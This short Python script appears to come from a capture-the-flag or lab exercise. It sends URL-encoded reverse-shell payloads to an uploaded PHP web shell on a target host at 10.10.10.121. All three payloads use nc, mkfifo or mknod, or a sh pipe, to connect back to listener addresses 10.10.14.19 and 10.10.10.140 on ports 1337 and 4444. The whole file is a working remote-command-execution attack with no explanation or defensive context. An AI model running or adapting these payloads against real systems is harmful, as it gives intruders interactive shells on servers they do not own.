import requests

payload3="rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.19%201337%20%3E%2Ftmp%2Ff%0A"
payload2= "rm%20-f%20%2Ftmp%2Fp%3B%20mknod%20%2Ftmp%2Fp%20p%20%26%26%20nc%2010.10.14.19%204444%200%2Ftmp%2Fp%0A"
payload="%2Fbin%2Fsh%20%7C%20nc%2010.10.10.140%204444%0A"

url = "http://10.10.10.121/support/uploads/tickets/aec84976be3a37c00c0ab3811ab6ffd9.php?cmd=" + payload3

r = requests.get(url)

print(r.text)
